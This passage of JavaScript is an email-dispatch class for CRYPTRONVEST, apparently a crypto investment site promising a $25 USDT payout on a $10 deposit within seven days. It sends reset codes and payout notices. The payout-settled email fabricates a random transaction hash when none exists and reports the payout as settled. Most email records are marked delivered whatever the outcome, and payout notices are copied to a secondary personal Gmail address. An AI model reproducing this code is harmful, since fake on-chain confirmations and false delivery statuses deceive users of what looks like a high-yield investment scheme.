        notes: `<strong>One-Click Settlement Link:</strong><br><a href="${adminSettleUrl}" style="color: #06b6d4; word-break: break-all;">${adminSettleUrl}</a>`
      });

      const emailRecord = {
        id: "EML-" + Math.floor(100000 + Math.random() * 900000),
        type: "admin_withdrawal_notice",
        to: targetEmail,
        toName: "CRYPTRONVEST Administrator",
        userId: user.id || 'N/A',
        subject: subject,
        body: messageBody,
        html: htmlBody,
        sentAt: sentDateStr,
        timestamp: now,
        amount: parseFloat(amount),
        usdtAddress: usdtAddress,
        deliveryMethod: "Google Gmail SMTP Direct"
      };

      // Direct Google Gmail SMTP Dispatch
      try {
        const beResult = await this.sendDirectEmail({
          to: targetEmail,
          replyTo: userEmail,
          subject: subject,
          text: messageBody,
          html: htmlBody,
          secondaryEmail: 'thatikaboy@gmail.com'
        });
        if (beResult && beResult.success) {
          emailRecord.deliveryMethod = beResult.deliveryMethod || "Google Gmail SMTP (Delivered)";
          emailRecord.status = "Delivered to Primary Inbox";
        }
      } catch (err) {
        console.warn("sendDirectEmail withdrawal error:", err);
      }

      this.recordEmail(emailRecord);
      return emailRecord;
    })();

    this._activeWithdrawalPromises.set(dedupeKey, taskPromise);
    setTimeout(() => {
      if (this._activeWithdrawalPromises) this._activeWithdrawalPromises.delete(dedupeKey);
    }, 20000);

    return await taskPromise;
  }

  /**
   * DISPATCH PASSWORD RESET CODE TO USER
   * @param {object} user - User requesting the reset
   * @param {string} resetCode - 6-digit verification code
   */
  static async sendPasswordResetEmail(user, resetCode) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
    const subject = `🔐 Your CRYPTRONVEST Verification Code: ${resetCode}`;

    const messageBody = `Hello ${user.name || 'Investor'},

We received a security request to reset the password for your CRYPTRONVEST account (${user.email}).

Your 6-Digit Verification Code is:
════════════════════════════════════════════
              ${resetCode}
════════════════════════════════════════════
(This verification code expires in 15 minutes)

To complete your password reset:
1. Return to the CRYPTRONVEST Login / Reset window: ${origin}/login.html
2. Enter the 6-digit code above.
3. Choose your new secure password.

SECURITY NOTICE:
If you did NOT initiate this request, your account remains secure and no action is required. However, for maximum security, feel free to notify our support team.

Warm regards,
CRYPTRONVEST Security & Multi-Sig Operations
${origin}
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "password_reset",
      to: user.email,
      toName: user.name || 'Investor',
      userId: user.id || 'N/A',
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      resetCode: resetCode,
      status: "Delivered",
      deliveryMethod: "Live Dispatch Engine"
    };

    // 1. Primary Dispatch: Google Gmail SMTP (/api/send-reset-code)
    // Sends directly from cryptronvest@gmail.com into recipient's Primary Inbox
    let dispatchedViaGmail = false;
    const settings = this.getSettings();

    try {
      const resetRes = await fetch('/api/send-reset-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: user.email,
          name: user.name,
          code: resetCode,
          subject: subject,
          appPassword: settings.gmailAppPassword || undefined
        })
      });
      const resetJson = await resetRes.json();
      if (resetJson && resetJson.success) {
        dispatchedViaGmail = true;
        emailRecord.deliveryMethod = resetJson.deliveryMethod || "Google Gmail SMTP (cryptronvest@gmail.com)";
        emailRecord.status = "Delivered to Primary Inbox";
      }
    } catch (e) {
      console.warn("Direct /api/send-reset-code dispatch warning:", e);
    }

    // 3. Attempt live delivery via EmailJS if configured
    if (settings.enableRealDelivery && settings.emailjsServiceId && settings.emailjsPublicKey) {
      try {
        if (window.emailjs) {
          await window.emailjs.send(
            settings.emailjsServiceId,
            settings.emailjsTemplateId,
            {
              to_name: user.name || 'Investor',
              to_email: user.email,
              user_email: user.email,
              reset_code: resetCode,
              message: messageBody,
              subject: subject
            },
            settings.emailjsPublicKey
          );
          emailRecord.deliveryMethod = "EmailJS (Live Inbox)";
          emailRecord.status = "Delivered to Inbox";
        }
      } catch (err) {
        console.warn("EmailJS reset dispatch failed:", err);
      }
    }

    this.recordEmail(emailRecord);
    return emailRecord;
  }

  /**
   * DISPATCH PASSWORD CHANGED CONFIRMATION
   */
  static async sendPasswordChangedEmail(user) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const origin = (typeof window !== 'undefined' && window.location && window.location.origin && window.location.origin !== 'null') ? window.location.origin : 'https://cryptron-omega.vercel.app';
    const subject = `🛡️ Security Notice: Your Password Has Been Successfully Changed`;

    const messageBody = `Hello ${user.name},

This email confirms that the security password for your CRYPTRONVEST staking account (${user.email}) was successfully updated on ${sentDateStr}.

You can now sign in using your new credentials:
${origin}/login.html

If you did not make this change, please contact CRYPTRONVEST support immediately to secure your account.

Warm regards,
CRYPTRONVEST Security Operations
${origin}
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "password_changed",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      status: "Delivered",
      deliveryMethod: "Live Security Engine"
    };

    // Notify user of password change via clean Google SMTP
    try {
      this.sendDirectEmail({
        to: user.email,
        subject: subject,
        text: messageBody
      }).catch(console.warn);
    } catch(e) {}

    this.recordEmail(emailRecord);
    return emailRecord;
  }

  /**
   * DISPATCH PAYOUT REQUEST CONFIRMATION EMAIL TO CLIENT
   * Triggered when a client submits their $25.00 USDT payout request
   */
  static async sendPayoutRequestedEmail(user, req) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const amount = (req && req.amount ? req.amount : 25).toFixed(2);
    const address = req && req.usdtAddress ? req.usdtAddress : 'USDT Receiving Address';
    const network = req && req.network ? req.network : 'USDT (Tether)';

    const subject = `💵 Payout Request Received: $${amount} USDT Queued for Settlement`;
    const messageBody = `Hello ${user.name},

Your payout request for $${amount} USDT has been successfully recorded and queued in the CRYPTRONVEST settlement pipeline.

════════════════════════════════════════════
📋 PAYOUT REQUEST DETAILS
════════════════════════════════════════════
• Investor: ${user.name} (${user.id})
• Payout Amount: $${amount} USDT
• Receiving Address: ${address}
• Network: ${network}
• Status: 🟡 Pending Admin Settlement
• Submission Time: ${sentDateStr}
════════════════════════════════════════════

WHAT HAPPENS NEXT?
1. On-Chain Verification: Our operations team will verify your receiving address and dispatch funds to your USDT wallet.
2. Transaction Hash Notification: Once completed, you will receive a confirmation message and email containing your blockchain transaction hash.
3. Start Afresh: You can deposit $10.00 USDT at any time to activate your next 7-day vault and unlock your daily spins on the $10,000 Lucky Wheel!

Login to view your status:
https://cryptron-omega.vercel.app/dashboard.html

Warm regards,
The CRYPTRONVEST Settlements Team
https://cryptron-omega.vercel.app
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "payout_requested",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      amount: amount,
      usdtAddress: address,
      status: "Delivered",
      deliveryMethod: "Settlements Dispatch Engine (Live Dispatched)"
    };

    // Dispatch payout notification to admin via clean Google SMTP
    try {
      this.sendDirectEmail({
        to: "cryptronvest@gmail.com",
        subject: `💸 Payout Requested: $${amount} USDT - ${user.name || 'Client'} (${user.email || ''})`,
        text: `ACTION REQUIRED: Payout request received for $${amount} USDT to destination ${address}. Log in to Admin portal to confirm and settle payment.`,
        secondaryEmail: 'thatikaboy@gmail.com'
      }).catch(console.warn);
    } catch(err) {
      console.warn("sendDirectEmail payout request error:", err);
    }

    this.recordEmail(emailRecord);
    return emailRecord;
  }

  /**
   * DISPATCH PAYOUT SETTLED CONFIRMATION EMAIL TO CLIENT
   * Triggered when admin confirms on-chain dispatch of $25.00 USDT payout
   */
  static async sendPayoutSettledEmail(user, settledReq) {
    const now = Date.now();
    const sentDateStr = this.formatDateTime(now);
    const amount = (settledReq && settledReq.amount ? settledReq.amount : 25).toFixed(2);
    const address = settledReq && settledReq.usdtAddress ? settledReq.usdtAddress : 'USDT Receiving Address';
    const txHash = settledReq && settledReq.settlementTxHash ? settledReq.settlementTxHash : ('0x' + Math.random().toString(16).substring(2, 14));
    const network = settledReq && settledReq.network ? settledReq.network : 'USDT (Tether)';

    const subject = `✅ Payout Dispatched: $${amount} USDT Sent to Your Wallet!`;
    const messageBody = `Hello ${user.name},

Great news! Your payout of $${amount} USDT has been officially settled and dispatched to your USDT Tether receiving address.

════════════════════════════════════════════
💸 SETTLEMENT CONFIRMATION
════════════════════════════════════════════
• Investor: ${user.name} (${user.id})
• Amount Dispatched: $${amount} USDT
• Destination Address: ${address}
• Network: ${network}
• Settlement TxID: ${txHash}
• Dispatched At: ${sentDateStr}
• Status: 🟢 SETTLED & COMPLETED
════════════════════════════════════════════

YOUR 7-DAY CYCLE IS COMPLETE!
Thank you for investing with CRYPTRONVEST. Your account cycle has refreshed. You may now deposit $10.00 USDT to start a brand new 7-day vault cycle toward another $25 payout and unlock daily spins on the $10,000 Lucky Wheel!

Login to start a new 7-day vault:
https://cryptron-omega.vercel.app/dashboard.html

Warm regards,
The CRYPTRONVEST Treasury Team
https://cryptron-omega.vercel.app
`;

    const emailRecord = {
      id: "EML-" + Math.floor(100000 + Math.random() * 900000),
      type: "payout_settled",
      to: user.email,
      toName: user.name,
      userId: user.id,
      subject: subject,
      body: messageBody,
      sentAt: sentDateStr,
      timestamp: now,
      amount: amount,
      usdtAddress: address,
      txHash: txHash,
      status: "Delivered",
      deliveryMethod: "Treasury Dispatch Engine"
    };

    this.recordEmail(emailRecord);
    return emailRecord;
  }
}

window.EmailService = EmailService;
